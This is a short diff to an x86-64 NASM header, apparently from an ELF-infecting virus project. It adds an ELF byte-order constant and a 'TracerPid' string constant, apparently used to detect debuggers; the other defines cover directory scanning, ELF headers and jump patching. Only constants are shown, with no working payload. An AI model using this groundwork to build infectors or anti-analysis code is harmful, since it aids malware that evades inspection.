@@ -6,6 +6,7 @@
 %define STACK_SIZE	4096
 %define DIRENT_SIZE	1024
 %define EHDR_SIZE	64
+%define EI_DATA		5
 %define JMP_REL_SIZE	5
 %define STDOUT		1
 %define ELFCLASS64	2
@@ -18,6 +19,7 @@
 %define PF_X		1
 %define PF_W		2
 %define PF_R		4
+%define TRACER_PID	0x6950726563617254
 
 ; Syscalls
 %define SYS_READ	0
